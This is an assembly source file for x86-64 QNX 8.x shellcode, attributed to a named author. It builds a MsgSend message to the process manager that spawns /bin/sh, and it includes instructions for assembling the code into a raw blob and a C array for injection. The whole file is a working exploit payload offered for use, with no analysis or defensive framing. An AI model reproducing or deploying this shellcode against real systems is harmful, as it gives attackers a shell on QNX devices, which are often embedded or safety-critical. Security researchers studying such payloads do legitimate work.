/*
 * QNX 8.x x86-64 Shellcode (not optimized)
 *   execve("/bin/sh", {"/bin/sh"}, {"PATH=/proc/boot:/system/bin"} )
 *
 * By Claes M Sjöberg <cmn@signedness.org>, May 2026
 *
 * Compile executable:
 *  ntox86_64-as -o execve_binsh.o execve_binsh.s
 *  qcc -Vgcc_ntox86_64 -nostdlib -o execve_binsh execve_binsh.o
 *  ntox86_64-objdump -S execve_binsh
 *
 * Create and disassemble blob:
 *  ntox86_64-as -o execve_binsh.o execve_binsh.s
 *  ntox86_64-ld --oformat binary -o execve_binsh.bin execve_binsh.o
 *  ntox86_64-objdump -D -b binary -m i386:x86-64 execve_binsh.bin 
 *
 * Create shellcode C array:
 *  xxd --include execve_binsh.bin
 */

.global main
.text
main:
    #
    # QNX 8.04 
    # MsgSend(0x40000000, (void *)&msg, sizeof(msg), NULL, 0))
    # MsgSend(%rdi,               %rsi,        %rdx, %r10, %r8)
    #

    # Align stack to 16 byte boundary
    pushq   %rax         # Increase stack to avoid truncating
    pushq   %rax        
    andq    $-16, %rsp   # Align down to 8 byte boundary

    # Build up the message to send using MsgSend() onto the stack.
    # Since the stack grow towards lower addresses, we start
    # from the end and build up all the required fields with as
    # many set to zero as possible.

    # envp {"PATH=/proc/boot:/system/bin"}
    movabs  $0x6e6962, %rax
    pushq   %rax                        # "bin\x00\x00\x00\x00\x00"
    movabs  $0x2f6d65747379732f, %rax
    pushq   %rax                        # "/system/"
    movabs  $0x3a746f6f622f636f, %rax
    pushq   %rax                        # "oc/boot:"
    movabs  $0x72702f3d48544150, %rax
    pushq   %rax                        # "PATH=/pr"

    # argv {"/bin/sh"}
    movabs  $0x68732f6e69622f2f, %rax   # '/bin/sh'
    shr     $8, %rax                    # NUL terminate string
    pushq   %rax

    # path "/bin/sh"
    pushq   %rax

    # nfds, nargv, narge, reserved, totbytes, pad
    # ignored by process manager, can be zero
    xorq    %rax, %rax
    pushq   %rax
    pushq   %rax

    # Mixed/unknown data (that can be zero), 96 bytes
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax
    pushq   %rax

    # Process related settings
    pushq   %rax                        # runmask
    pushq   %rax                        # stackmax, policy
    movq    $0x0001000000000000, %rax   # constant
    pushq   %rax                        # 

    # The 0x24 at the end of this uint64_t is 
    # strlen(path) + 1 + strlen(envp[0]) + 1
    # So modify this if you want to exec anything else but /bin/sh
    movq    $0x0000008800000024, %rax   # %rax = constant + strlen..
    pushq   %rax                        

    # More zeroes
    xorq    %rax, %rax 
    pushq   %rax       
    pushq   %rax       

    # type, subtype, pathlen and searchpath
    movq    $0x0001000800060010, %rax
    pushq   %rax

    # Set up all syscall arguments
    # MsgSend(0x40000000, (void *)&msg, sizeof(msg), NULL, 0))
    # MsgSend(%rdi,               %rsi,        %rdx, %r10, %r8)
    movq    $0x40000000, %rdi   # coid (process manager)
    movq    %rsp, %rsi          # &msg 
    movq    $0xd4, %rdx         # sizeof(msg)
    xorq    %r10, %r10          # NULL
    xorq    %r8, %r8            # 0
    neg     %rdx                # As done in MsgSend() in libc
    neg     %r8                 # As done in MsgSend() in libc
    movq    $0xb, %rax          # MsgSend syscall number (11)
    syscall


